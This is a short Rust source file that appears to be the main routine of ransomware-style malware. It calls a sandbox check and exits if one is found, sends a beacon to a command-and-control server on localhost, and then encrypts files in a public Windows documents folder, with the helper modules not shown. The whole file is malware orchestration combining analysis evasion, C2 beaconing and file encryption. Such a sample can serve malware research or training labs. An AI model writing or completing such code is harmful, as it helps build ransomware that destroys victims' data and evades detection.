mod stealth;
mod fileops;

fn main() {
    // Exit if running in a sandbox.
    if stealth::is_sandbox() {
        println!("Sandbox environment detected. Exiting.");
        return;
    }

    // Send beacon to local C2 server.
    stealth::beacon_to_localhost();

    // Encrypt files in the specified directory.
    let target_directory = "C:\\Users\\Public\\Documents";
    fileops::encrypt_directory(target_directory);
}
